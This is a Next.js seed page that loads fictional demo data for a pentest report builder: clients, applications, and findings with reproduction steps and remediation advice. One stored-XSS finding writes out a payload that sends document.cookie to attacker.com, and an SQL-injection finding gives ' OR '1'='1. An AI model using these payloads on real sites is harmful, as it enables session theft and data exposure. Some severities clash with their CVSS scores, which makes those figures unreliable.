'use client';
import { useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';
import { AppState } from '@/lib/types';

const STORAGE_KEY = 'security_report_builder_data';
const now = () => new Date().toISOString();
const d = (daysAgo: number) => new Date(Date.now() - daysAgo * 86400000).toISOString();
const id = (prefix: string) => `${prefix}_${Math.random().toString(36).substr(2, 9)}`;

export default function SeedPage() {
  const router = useRouter();
  const [status, setStatus] = useState('Seeding demo data...');

  useEffect(() => {
    try {
      const spId = 'sp_oknexus_demo';

      // ── Engineers ──────────────────────────────────────────────────────────
      const engineers = [
        { id: 'eng_arjun', name: 'Arjun Sharma', email: 'arjun.sharma@oknexus.io', role: 'Lead Security Engineer' },
        { id: 'eng_priya', name: 'Priya Nair', email: 'priya.nair@oknexus.io', role: 'Senior Penetration Tester' },
        { id: 'eng_rohan', name: 'Rohan Mehta', email: 'rohan.mehta@oknexus.io', role: 'Cloud Security Specialist' },
        { id: 'eng_ananya', name: 'Ananya Iyer', email: 'ananya.iyer@oknexus.io', role: 'Security Analyst' },
        { id: 'eng_kiran', name: 'Kiran Desai', email: 'kiran.desai@oknexus.io', role: 'Penetration Tester' },
      ].map(e => ({ ...e, exposure: { vulnerabilityClasses: ['XSS','SQLi','IDOR','SSRF'], applicationTypes: ['Web','API','Mobile'], authModels: ['OAuth 2.0','JWT'], totalEngagements: 12, lastEngagementDate: d(10) }, createdAt: d(180), updatedAt: d(10) }));

      // ── Service Provider ──────────────────────────────────────────────────
      const sp = { id: spId, companyName: 'OkNexus Security', contactEmail: 'hello@oknexus.io', website: 'https://oknexus.io', legalDisclaimer: 'This report is confidential and intended solely for the named recipient.', defaultSeverityModel: 'CVSS' as const, defaultRemediationTone: 'Balanced' as const, createdAt: d(365), updatedAt: d(1) };

      // ── Clients ───────────────────────────────────────────────────────────
      const clientFintech = { id: 'cl_fintech', companyName: 'ZestPay Financial', industry: 'FinTech', techStack: 'React, Node.js, PostgreSQL, AWS', description: 'A fast-growing B2B payments platform handling UPI and card transactions.', contactName: 'Vivek Bhatia', contactEmail: 'vivek@zestpay.in', riskTolerance: 'Low' as const, preferredReportDepth: 'Detailed' as const, createdAt: d(300), updatedAt: d(30) };
      const clientHealth = { id: 'cl_health', companyName: 'CarePlus HealthTech', industry: 'Healthcare', techStack: 'Next.js, Python/Django, MongoDB, Azure', description: 'Patient management and telemedicine SaaS for hospitals across India.', contactName: 'Sneha Agarwal', contactEmail: 'sneha@careplus.health', riskTolerance: 'Low' as const, preferredReportDepth: 'Detailed' as const, createdAt: d(250), updatedAt: d(20) };
      const clientEdu = { id: 'cl_edu', companyName: 'LearnSphere EdTech', industry: 'Education', techStack: 'Vue.js, FastAPI, MySQL, GCP', description: 'Online learning platform serving 2M+ students across tier-2 cities.', contactName: 'Rahul Tiwari', contactEmail: 'rahul@learnsphere.in', riskTolerance: 'Medium' as const, preferredReportDepth: 'Standard' as const, createdAt: d(200), updatedAt: d(15) };
      const clientLogistics = { id: 'cl_logistics', companyName: 'SwiftMove Logistics', industry: 'Logistics & Supply Chain', techStack: 'Angular, Java Spring, Oracle DB, AWS', description: 'Fleet management and last-mile delivery tracking platform.', contactName: 'Nandini Kulkarni', contactEmail: 'nandini@swiftmove.co', riskTolerance: 'Medium' as const, preferredReportDepth: 'Standard' as const, createdAt: d(150), updatedAt: d(5) };
      const clients = [clientFintech, clientHealth, clientEdu, clientLogistics];

      // ── Applications ──────────────────────────────────────────────────────
      const apps = [
        // ZestPay
        { id: 'app_zp_web', clientId: 'cl_fintech', name: 'ZestPay Merchant Portal', description: 'Web dashboard for merchants to manage payments and analytics.', technologyStack: ['React 18', 'Node.js', 'PostgreSQL', 'Redis', 'AWS ECS'], authModel: 'OAuth 2.0 + JWT', knownWeakAreas: ['Payment webhook validation', 'Admin privilege escalation paths'] },
        { id: 'app_zp_api', clientId: 'cl_fintech', name: 'ZestPay Payment API', description: 'Core REST API handling card and UPI transaction flow.', technologyStack: ['Node.js', 'Express', 'PostgreSQL', 'Stripe SDK'], authModel: 'API Key + HMAC signing', knownWeakAreas: ['Race conditions in concurrent transfers'] },
        { id: 'app_zp_mobile', clientId: 'cl_fintech', name: 'ZestPay Consumer App', description: 'iOS/Android app for end users.', technologyStack: ['React Native', 'Node.js BFF'], authModel: 'OTP + Biometric', knownWeakAreas: ['SSL pinning bypass', 'Jailbreak detection'] },
        // CarePlus
        { id: 'app_cp_portal', clientId: 'cl_health', name: 'CarePlus Patient Portal', description: 'Patient-facing web portal for appointments and records.', technologyStack: ['Next.js', 'Python Django', 'MongoDB', 'Azure'], authModel: 'SAML 2.0', knownWeakAreas: ['PHI data exposure in API responses', 'File upload validation'] },
        { id: 'app_cp_ehr', clientId: 'cl_health', name: 'CarePlus EHR System', description: 'Electronic Health Records management for clinicians.', technologyStack: ['React', 'Python', 'PostgreSQL', 'Azure Blob'], authModel: 'Azure AD SSO', knownWeakAreas: ['Audit log tampering', 'IDOR in patient record access'] },
        // LearnSphere
        { id: 'app_ls_lms', clientId: 'cl_edu', name: 'LearnSphere LMS', description: 'Core learning management system with course delivery.', technologyStack: ['Vue.js', 'FastAPI', 'MySQL', 'GCP Storage'], authModel: 'Google OAuth', knownWeakAreas: ['Account takeover via email enumeration'] },
        { id: 'app_ls_admin', clientId: 'cl_edu', name: 'LearnSphere Admin Panel', description: 'Internal admin panel for content and user management.', technologyStack: ['Vue.js', 'FastAPI', 'MySQL'], authModel: 'Username/Password', knownWeakAreas: ['No MFA enforced for admins', 'Weak session tokens'] },
        // SwiftMove
        { id: 'app_sm_fleet', clientId: 'cl_logistics', name: 'SwiftMove Fleet Tracker', description: 'Real-time GPS fleet tracking and dispatch system.', technologyStack: ['Angular', 'Java Spring Boot', 'Oracle DB', 'Kafka'], authModel: 'JWT', knownWeakAreas: ['GPS spoofing', 'Insecure WebSocket connections'] },
        { id: 'app_sm_driver', clientId: 'cl_logistics', name: 'SwiftMove Driver App', description: 'Mobile app for delivery drivers with proof-of-delivery.', technologyStack: ['Flutter', 'Java Spring BFF'], authModel: 'PIN + OTP', knownWeakAreas: ['Order data leakage between drivers'] },
      ].map(a => ({ ...a, createdAt: d(200), updatedAt: d(10) }));

      // ── Template ──────────────────────────────────────────────────────────
      const templates = [{
        id: 'enterprise',
        name: 'Enterprise Pentest Pro',
        description: 'Comprehensive pentest report with CVSS scoring, remediation roadmap, and executive-ready risk summary.',
        strictnessLevel: 'flexible',
        technicalVerbosity: 'High',
        businessLanguageLevel: 'High',
        includeCVSS: true, includeCWE: true, includeOWASP: true,
        aiGenerated: true,
        aiWizardPrompt: 'Enterprise-grade pentest report for regulated sectors. Navy blue branding.',
        branding: {
          primaryColor: '#1e3a5f', secondaryColor: '#0ea5e9', accentColor: '#f59e0b',
          colorScheme: ['#1e3a5f','#0ea5e9','#f59e0b','#16a34a','#dc2626'],
          primaryFont: 'Inter', secondaryFont: 'Roboto',
          logoPlacement: 'cover-and-header',
          useEnhancedCover: true, showChartsInExecutiveSummary: true, showRiskMatrix: true,
          footerText: 'Confidential — OkNexus Security',
          confidentialityNotice: 'This document contains confidential security assessment information. Unauthorized disclosure is prohibited.',
        },
        visualStyle: { fontFamily: 'inter', spacingDensity: 'comfortable', pageSize: 'A4', showPageNumbers: true, showHeaderFooter: true, headingScale: 'comfortable' },
        sections: [
          { id: 'coverPage', title: 'Cover Page', type: 'standard', isVisible: true, isLocked: true, componentName: 'CoverPage' },
          { id: 'executiveSummary', title: 'Executive Summary', type: 'standard', isVisible: true, isLocked: true, componentName: 'ExecutiveSummary' },
          { id: 'scope', title: 'Scope & Methodology', type: 'standard', isVisible: true, componentName: 'ScopeAndMethodology' },
          { id: 'findings', title: 'Findings', type: 'standard', isVisible: true, isLocked: true, componentName: 'FindingsList' },
          { id: 'riskMatrix', title: 'Risk Matrix', type: 'standard', isVisible: true, componentName: 'RiskMatrix' },
          { id: 'remediationRoadmap', title: 'Remediation Roadmap', type: 'standard', isVisible: true, componentName: 'RemediationRoadmap' },
          { id: 'conclusion', title: 'Conclusion', type: 'standard', isVisible: true, componentName: 'Conclusion' },
          { id: 'custom_compliance', title: 'Regulatory Compliance Mapping', type: 'custom', isVisible: true, content: 'Maps findings to RBI, DPDP Act, and ISO 27001 controls relevant to the assessed environment.' },
        ],
      }];

      // ── Helper to build findings ──────────────────────────────────────────
      const mkFinding = (overrides: any) => ({ id: id('f'), status: 'Open', discoveryDate: d(Math.floor(Math.random()*60)+5), createdAt: d(60), updatedAt: d(5), findingType: 'penetration', ...overrides });

      // ── Engagements ───────────────────────────────────────────────────────
      const engagements: any[] = [
        // ── ZestPay Engagements ──
        {
          id: 'eng_zp_1', serviceProviderId: spId, clientId: 'cl_fintech', applicationId: 'app_zp_web',
          engineerIds: ['eng_arjun', 'eng_priya'], templateId: 'enterprise',
          status: 'Completed',
          metadata: { engagementName: 'ZestPay Merchant Portal — Q1 Pentest', assessmentType: 'Penetration Testing', startDate: d(90), endDate: d(70), testingMethodology: 'Black-box + Grey-box hybrid', scope: ['https://merchant.zestpay.in', 'Admin panel', 'API endpoints'], outOfScope: ['Third-party payment processors', 'Physical infrastructure'], assumptions: ['Test accounts provided by client'], limitations: [], toolsUsed: ['Burp Suite Pro', 'Nmap', 'Nuclei', 'Metasploit'] },
          findings: [
            mkFinding({ title: 'SQL Injection in Merchant Search Filter', severity: 'Critical', category: 'Injection', description: 'The `q` parameter in `/api/merchants/search` is directly concatenated into a PostgreSQL query without parameterization, allowing full database read access.', impact: 'An attacker can exfiltrate all merchant PII, transaction records, and API keys stored in the database.', remediation: 'Use parameterized queries or an ORM. Validate and sanitize all user inputs before database interaction.', stepsToReproduce: "1. Login as any merchant\n2. Navigate to /search\n3. Enter `' OR '1'='1` in the search field\n4. Observe all merchants returned", cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H', baseScore: 9.9 }, affectedAssets: ['merchant.zestpay.in/api/merchants/search'], attackSurface: 'Web', cweIds: ['CWE-89'], owaspCategories: ['A03:2021 - Injection'], status: 'Resolved' }),
            mkFinding({ title: 'Broken Object Level Authorization (IDOR) in Transaction API', severity: 'High', category: 'Access Control', description: 'The `/api/transactions/:id` endpoint does not verify the requesting merchant owns the transaction. Any authenticated merchant can access any transaction by enumerating numeric IDs.', impact: 'Full read access to competitor transaction data including amounts, buyer details, and payment methods.', remediation: 'Implement server-side ownership checks. Use UUIDs instead of sequential integer IDs.', stepsToReproduce: "1. Create a transaction as Merchant A (e.g. txn_id=1001)\n2. Login as Merchant B\n3. GET /api/transactions/1001 — observe successful response with Merchant A's data", cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N', baseScore: 6.5 }, affectedAssets: ['api/transactions/:id'], attackSurface: 'API', cweIds: ['CWE-639'], owaspCategories: ['A01:2021 - Broken Access Control'], status: 'In Progress' }),
            mkFinding({ title: 'Stored XSS in Business Name Field', severity: 'High', category: 'XSS', description: 'The merchant business name is reflected in the admin dashboard without HTML encoding, allowing stored XSS.', impact: 'Account takeover of OkNexus admin users who view merchant listings.', remediation: 'Apply context-aware output encoding. Use Content Security Policy headers.', stepsToReproduce: "1. Register merchant with name: <script>fetch('https://attacker.com?c='+document.cookie)</script>\n2. Login as admin and view merchant list", cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N', baseScore: 8.7 }, affectedAssets: ['admin.zestpay.in/merchants'], attackSurface: 'Web', cweIds: ['CWE-79'], owaspCategories: ['A03:2021 - Injection'] }),
            mkFinding({ title: 'Missing Rate Limiting on OTP Endpoint', severity: 'Medium', category: 'Authentication', description: 'The `/auth/otp/verify` endpoint has no rate limiting or account lockout allowing brute-force of 6-digit OTPs.', impact: 'Attacker can brute-force the OTP within ~30 minutes to take over any account.', remediation: 'Implement rate limiting (max 5 attempts), CAPTCHA, and exponential backoff.', cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N', baseScore: 9.1 }, affectedAssets: ['/auth/otp/verify'], attackSurface: 'API', cweIds: ['CWE-307'] }),
            mkFinding({ title: 'Sensitive Data in HTTP Response Headers', severity: 'Low', category: 'Information Disclosure', description: 'Server responses expose `X-Powered-By: Express 4.18.2` and `Server: nginx/1.22.0` headers.', impact: 'Aids attacker reconnaissance by revealing exact technology versions.', remediation: 'Remove or mask Server and X-Powered-By headers in nginx config and Express settings.', cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N', baseScore: 5.3 }, status: 'Resolved' }),
          ],
        },
        {
          id: 'eng_zp_2', serviceProviderId: spId, clientId: 'cl_fintech', applicationId: 'app_zp_api',
          engineerIds: ['eng_rohan', 'eng_arjun'], templateId: 'enterprise',
          status: 'Completed',
          metadata: { engagementName: 'ZestPay Payment API — Security Audit', assessmentType: 'Penetration Testing', startDate: d(60), endDate: d(45), testingMethodology: 'White-box API review + dynamic testing', scope: ['Payment API v2', 'Webhook endpoints', 'HMAC signing flow'], outOfScope: ['Stripe platform itself'], assumptions: ['API docs and credentials provided'], limitations: [], toolsUsed: ['Burp Suite', 'Postman', 'OWASP ZAP'] },
          findings: [
            mkFinding({ title: 'HMAC Signature Bypass via Parameter Pollution', severity: 'Critical', category: 'Authentication', description: 'By duplicating the `amount` parameter in a POST body, the backend signs only the first value but processes the second, allowing payment amount manipulation.', impact: 'Attacker can charge ₹1 for a ₹10,000 transaction.', remediation: 'Normalize request parameters before HMAC computation. Reject duplicate keys.', cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N', baseScore: 9.6 }, affectedAssets: ['/v2/payments/create'], attackSurface: 'API', cweIds: ['CWE-20'] }),
            mkFinding({ title: 'Race Condition in Concurrent Refund Requests', severity: 'High', category: 'Business Logic', description: 'Sending simultaneous refund requests for the same transaction ID results in multiple refunds being processed due to missing database-level locking.', impact: 'Financial loss through refund duplication.', remediation: 'Implement idempotency keys and database-level row locking (SELECT FOR UPDATE).', cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N', baseScore: 5.3 }, affectedAssets: ['/v2/refunds'], attackSurface: 'API', status: 'In Progress' }),
            mkFinding({ title: 'Webhook Secret Exposed in Error Logs', severity: 'Medium', category: 'Information Disclosure', description: 'Failed webhook deliveries log the full request including the `X-Webhook-Secret` header to CloudWatch in plaintext.', impact: 'Anyone with CloudWatch access can forge webhooks from any source.', remediation: 'Scrub sensitive headers from logs. Rotate the webhook secret immediately.', cvss: { version: '3.1', vector: 'CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N', baseScore: 6.0 }, status: 'Resolved' }),
          ],
        },
        {
          id: 'eng_zp_3', serviceProviderId: spId, clientId: 'cl_fintech', applicationId: 'app_zp_mobile',
          engineerIds: ['eng_priya', 'eng_kiran'], templateId: 'enterprise',
          status: 'In Progress',
          metadata: { engagementName: 'ZestPay Consumer Mobile App — VAPT', assessmentType: 'Penetration Testing', startDate: d(20), endDate: d(-10), testingMethodology: 'Mobile (Android + iOS) — dynamic and static analysis', scope: ['Android APK v3.2.1', 'iOS IPA v3.2.0', 'Backend BFF API'], outOfScope: ['OS-level vulnerabilities'], assumptions: ['Rooted Android device and jailbroken iPhone provided'], limitations: [], toolsUsed: ['Frida', 'Objection', 'MobSF', 'Burp Suite'] },
          findings: [
            mkFinding({ title: 'SSL Pinning Bypass via Frida Hook', severity: 'High', category: 'Transport Security', description: 'The Android app uses a bypassable SSL pinning implementation. Frida can hook TrustManager at runtime to disable certificate validation.', impact: 'MitM attacks can intercept all API traffic including auth tokens and transaction data.', remediation: 'Implement certificate pinning using Network Security Config + OkHttp CertificatePinner. Add Frida detection.', cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N', baseScore: 7.4 }, attackSurface: 'Mobile' }),
            mkFinding({ title: 'Sensitive Data Stored in Unencrypted SharedPreferences', severity: 'High', category: 'Data Storage', description: 'The user\'s JWT and PIN hash are stored in Android SharedPreferences file without encryption, accessible on rooted devices.', impact: 'Attacker with physical device access can extract auth tokens and impersonate the user.', remediation: 'Use Android EncryptedSharedPreferences or Android Keystore for storing sensitive data.', cvss: { version: '3.1', vector: 'CVSS:3.1/AV:P/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N', baseScore: 6.1 }, attackSurface: 'Mobile' }),
          ],
        },
        // ── CarePlus Engagements ──
        {
          id: 'eng_cp_1', serviceProviderId: spId, clientId: 'cl_health', applicationId: 'app_cp_portal',
          engineerIds: ['eng_ananya', 'eng_kiran'], templateId: 'enterprise',
          status: 'Completed',
          metadata: { engagementName: 'CarePlus Patient Portal — HIPAA Compliance Pentest', assessmentType: 'Penetration Testing', startDate: d(120), endDate: d(100), testingMethodology: 'Grey-box. Focus on PHI exposure and access control.', scope: ['Patient portal', 'Appointment booking API', 'Document upload'], outOfScope: ['Hospital internal network'], assumptions: ['Test patient accounts provided'], limitations: [], toolsUsed: ['Burp Suite', 'Nikto', 'OWASP ZAP'] },
          findings: [
            mkFinding({ title: 'IDOR Exposing Other Patients\' Health Records', severity: 'Critical', category: 'Access Control', description: 'The GET /api/records/:patientId endpoint only checks if the user is authenticated, not if they own the record. Any logged-in patient can access any other patient\'s PHI by changing the ID.', impact: 'Full exposure of protected health information (PHI) for all patients — HIPAA violation.', remediation: 'Implement resource ownership checks server-side. Never trust client-provided resource IDs without authorization.', cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N', baseScore: 7.7 }, affectedAssets: ['/api/records/:patientId'], attackSurface: 'API', cweIds: ['CWE-639'], owaspCategories: ['A01:2021 - Broken Access Control'] }),
            mkFinding({ title: 'Unrestricted File Upload with Server-Side Execution', severity: 'Critical', category: 'File Upload', description: 'The prescription upload endpoint accepts PHP files. Uploaded files are stored in a web-accessible directory and executed by the server.', impact: 'Remote code execution — complete server compromise.', remediation: 'Validate file type by magic bytes, not extension. Store uploads outside web root. Rename files on server.', cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H', baseScore: 9.9 }, attackSurface: 'Web', status: 'Resolved' }),
            mkFinding({ title: 'PII Returned in API Error Messages', severity: 'Medium', category: 'Information Disclosure', description: 'Database error messages containing patient names and phone numbers are returned in HTTP 500 responses when invalid dates are submitted.', impact: 'Information leakage of patient PII to unauthenticated users.', remediation: 'Implement generic error messages for production. Log detailed errors server-side only.', cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:M/I:N/A:N', baseScore: 5.3 }, status: 'Resolved' }),
            mkFinding({ title: 'Session Token Not Invalidated on Logout', severity: 'Medium', category: 'Session Management', description: 'After calling /auth/logout, the JWT token remains valid until its 24-hour expiry. No server-side token revocation list exists.', impact: 'Stolen tokens remain usable long after the user logs out.', remediation: 'Implement a token blocklist (Redis) and validate against it on each request.', cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:M/I:L/A:N', baseScore: 5.4 } }),
          ],
        },
        {
          id: 'eng_cp_2', serviceProviderId: spId, clientId: 'cl_health', applicationId: 'app_cp_ehr',
          engineerIds: ['eng_arjun', 'eng_ananya'], templateId: 'enterprise',
          status: 'Review',
          metadata: { engagementName: 'CarePlus EHR System — Architecture Review', assessmentType: 'Architecture Review', startDate: d(40), endDate: d(25), testingMethodology: 'Design review, threat modeling, data-flow diagram analysis', scope: ['EHR API', 'Azure AD integration', 'Audit log pipeline'], outOfScope: ['Azure infrastructure itself'], assumptions: ['Architecture docs, sequence diagrams shared'], limitations: [], toolsUsed: ['Threat Dragon', 'Draw.io reviews'] },
          findings: [
            mkFinding({ findingType: 'architecture', title: 'Audit Logs Stored in Same Database as Application Data', severity: 'High', category: 'Audit & Accountability', description: 'Audit logs for PHI access are stored in the same MongoDB instance as application data, allowing a compromised application account to delete or modify audit records.', impact: 'Attacker or rogue admin can erase access trails — violates HIPAA audit controls.', remediation: 'Store audit logs in a separate append-only data store (e.g., Azure Immutable Blob Storage or a WORM-compliant database).', designComponent: 'Audit Logging Subsystem', concernCategory: 'Security', currentDesign: 'Logs written to MongoDB application database.', recommendedDesignChanges: 'Separate write-only audit log service with immutable storage.', implementationPriority: 'High' }),
            mkFinding({ findingType: 'architecture', title: 'No Encryption at Rest for EHR Document Blobs', severity: 'High', category: 'Data Protection', description: 'Scanned documents and lab reports are stored in Azure Blob Storage without server-side encryption enabled.', impact: 'If Azure account is compromised, all patient documents are exposed in plaintext.', remediation: 'Enable Azure Storage Service Encryption with customer-managed keys (CMK) via Azure Key Vault.', designComponent: 'Document Storage', concernCategory: 'Security', currentDesign: 'Azure Blob without SSE.', recommendedDesignChanges: 'Enable SSE-CMK via Key Vault.', implementationPriority: 'Critical' }),
          ],
        },
        // ── LearnSphere Engagements ──
        {
          id: 'eng_ls_1', serviceProviderId: spId, clientId: 'cl_edu', applicationId: 'app_ls_lms',
          engineerIds: ['eng_kiran', 'eng_priya'], templateId: 'enterprise',
          status: 'Completed',
          metadata: { engagementName: 'LearnSphere LMS — Security Assessment', assessmentType: 'Penetration Testing', startDate: d(80), endDate: d(65), testingMethodology: 'Black-box web application testing', scope: ['LMS web app', 'Course delivery API', 'Payment integration'], outOfScope: ['GCP infrastructure'], assumptions: ['Student and instructor test accounts'], limitations: [], toolsUsed: ['Burp Suite', 'Nuclei', 'SQLMap'] },
          findings: [
            mkFinding({ title: 'Account Takeover via Email Enumeration + Weak Reset Token', severity: 'High', category: 'Authentication', description: 'Password reset tokens are 6-digit numeric codes with a 1-hour expiry and no rate limiting. The reset form also reveals whether an email exists via different error messages.', impact: 'Targeted account takeover of student/instructor accounts with access to paid course content.', remediation: 'Use cryptographically random 32-char tokens. Generic error messages for all reset attempts. Rate limit to 3 attempts/hour.', cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N', baseScore: 9.1 }, affectedAssets: ['/auth/forgot-password', '/auth/reset-password'], attackSurface: 'Web', status: 'Resolved' }),
            mkFinding({ title: 'Insecure Direct Object Reference in Course Content', severity: 'High', category: 'Access Control', description: 'Paid course videos are served from predictable GCS URLs without authentication. Any user who has the URL can access premium content without purchasing.', impact: 'Revenue loss from pirated course content.', remediation: 'Use GCS signed URLs with short expiry (15 min). Validate user entitlement server-side before generating each URL.', cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N', baseScore: 7.5 }, attackSurface: 'Web', status: 'In Progress' }),
            mkFinding({ title: 'Cross-Site Request Forgery on Course Enrollment', severity: 'Medium', category: 'CSRF', description: 'The course enrollment POST endpoint does not require a CSRF token or SameSite cookie attribute, making it vulnerable to CSRF attacks.', impact: 'Attacker can trick a logged-in instructor into unenrolling students or modifying course details.', remediation: 'Implement CSRF tokens for all state-changing requests. Set SameSite=Strict on session cookies.', cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:M/A:N', baseScore: 4.3 }, status: 'Resolved' }),
          ],
        },
        {
          id: 'eng_ls_2', serviceProviderId: spId, clientId: 'cl_edu', applicationId: 'app_ls_admin',
          engineerIds: ['eng_rohan'], templateId: 'enterprise',
          status: 'Completed',
          metadata: { engagementName: 'LearnSphere Admin Panel — Internal Audit', assessmentType: 'Security Review', startDate: d(50), endDate: d(40), testingMethodology: 'Grey-box. Admin credentials provided.', scope: ['Admin dashboard', 'User management', 'Content management'], outOfScope: ['LMS student-facing app'], assumptions: ['Admin dev credentials provided'], limitations: [], toolsUsed: ['Burp Suite', 'Manual code review'] },
          findings: [
            mkFinding({ title: 'No Multi-Factor Authentication for Admin Accounts', severity: 'Critical', category: 'Authentication', description: 'Admin panel only requires username/password with no MFA. Passwords as weak as 6 characters are accepted.', impact: 'Single factor compromise gives full admin access to all 2M+ student records.', remediation: 'Enforce TOTP-based MFA for all admin accounts. Minimum 12-char passwords with complexity requirements.', cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H', baseScore: 10.0 }, status: 'In Progress' }),
            mkFinding({ title: 'Admin Session Does Not Expire', severity: 'Medium', category: 'Session Management', description: 'Admin sessions are set to expire after 30 days with no idle timeout. Session tokens are not rotated after privilege escalation.', impact: 'A stolen admin cookie from a shared device remains valid for 30 days.', remediation: 'Set session expiry to 8 hours. Implement idle timeout of 30 minutes. Rotate session tokens on each login.', cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N', baseScore: 8.1 } }),
          ],
        },
        // ── SwiftMove Engagements ──
        {
          id: 'eng_sm_1', serviceProviderId: spId, clientId: 'cl_logistics', applicationId: 'app_sm_fleet',
          engineerIds: ['eng_arjun', 'eng_rohan', 'eng_ananya'], templateId: 'enterprise',
          status: 'Completed',
          metadata: { engagementName: 'SwiftMove Fleet Tracker — Network + App Pentest', assessmentType: 'Penetration Testing', startDate: d(100), endDate: d(80), testingMethodology: 'Black-box testing of web app and WebSocket API', scope: ['Fleet tracking dashboard', 'WebSocket GPS feed', 'Dispatch API'], outOfScope: ['GPS hardware', 'Carrier network'], assumptions: ['Driver and dispatcher accounts provided'], limitations: [], toolsUsed: ['Burp Suite', 'wscat', 'Wireshark', 'Nmap'] },
          findings: [
            mkFinding({ title: 'Unauthenticated WebSocket Endpoint Leaks All Vehicle Locations', severity: 'Critical', category: 'Access Control', description: 'The WebSocket endpoint ws://fleet.swiftmove.co/live-feed does not require authentication. Connecting to it streams GPS coordinates and driver identities for all active vehicles in real-time.', impact: 'Real-time stalking of all delivery drivers. Competitor can monitor all deliveries.', remediation: 'Require a valid JWT in the WebSocket upgrade request header or as an initial auth message. Implement per-user data filtering.', cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N', baseScore: 8.6 }, affectedAssets: ['ws://fleet.swiftmove.co/live-feed'], attackSurface: 'Network', cweIds: ['CWE-306'], status: 'Resolved' }),
            mkFinding({ title: 'SQL Injection in Fleet Search API', severity: 'Critical', category: 'Injection', description: 'The `driverName` filter in the dispatch API is vulnerable to SQL injection via the ORDER BY clause.', impact: 'Full Oracle DB read access. Potential for data destruction.', remediation: 'Whitelist allowed sort columns. Use parameterized queries.', cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H', baseScore: 9.9 }, attackSurface: 'API', status: 'In Progress' }),
            mkFinding({ title: 'GPS Coordinates Spoofable via Direct API Call', severity: 'High', category: 'Business Logic', description: 'The driver location update API at /api/driver/:id/location accepts any GPS coordinate without validating it against historical location data or geofencing rules.', impact: 'Driver can fake delivery completion from home by sending false GPS coordinates.', remediation: 'Implement server-side plausibility checks (max speed, geofence boundaries). Use signed GPS payloads from trusted hardware.', cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N', baseScore: 6.5 }, attackSurface: 'API' }),
            mkFinding({ title: 'Sensitive Driver PII in URL Parameters', severity: 'Medium', category: 'Information Disclosure', description: 'Driver phone numbers and Aadhaar last-4 digits are passed as URL query parameters in several API calls, causing them to appear in server logs and browser history.', impact: 'Potential exposure of driver PII in web server logs.', remediation: 'Move sensitive identifiers to request body (POST) or headers. Strip PII from logging.', cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:M/I:N/A:N', baseScore: 4.3 } }),
          ],
        },
        {
          id: 'eng_sm_2', serviceProviderId: spId, clientId: 'cl_logistics', applicationId: 'app_sm_driver',
          engineerIds: ['eng_priya', 'eng_kiran'], templateId: 'enterprise',
          status: 'In Progress',
          metadata: { engagementName: 'SwiftMove Driver App — Mobile VAPT', assessmentType: 'Penetration Testing', startDate: d(15), endDate: d(-5), testingMethodology: 'Mobile dynamic analysis on Android (Flutter)', scope: ['SwiftMove Driver APK v2.1', 'Driver BFF API'], outOfScope: ['iOS app'], assumptions: ['Company test device with rooting allowed'], limitations: [], toolsUsed: ['MobSF', 'Frida', 'Burp Suite', 'apktool'] },
          findings: [
            mkFinding({ title: 'Order Data Cross-Contamination Between Drivers', severity: 'High', category: 'Access Control', description: 'When the app fetches "nearby unassigned orders", the API returns all orders in a 10km radius regardless of driver assignment. A driver can accept orders already assigned to another driver.', impact: 'Delivery disruption, financial loss, customer disputes.', remediation: 'Filter order visibility server-side based on assignment status and driver authorization.', cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:M/I:H/A:N', baseScore: 7.1 }, attackSurface: 'Mobile' }),
            mkFinding({ title: 'Hardcoded API Base URL and Debug Flag in APK', severity: 'Low', category: 'Configuration', description: 'Decompiling the APK reveals a hardcoded staging API URL (https://staging-api.swiftmove.internal) and a debug flag `ENABLE_TEST_MODE=true` that disables signature verification.', impact: 'Exposes staging infrastructure. Debug mode bypasses security checks.', remediation: 'Use build flavors to separate prod/staging config. Never ship debug flags in production builds.', cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N', baseScore: 5.3 } }),
          ],
        },
      ].map(e => ({ ...e, createdAt: d(120), updatedAt: d(5) }));

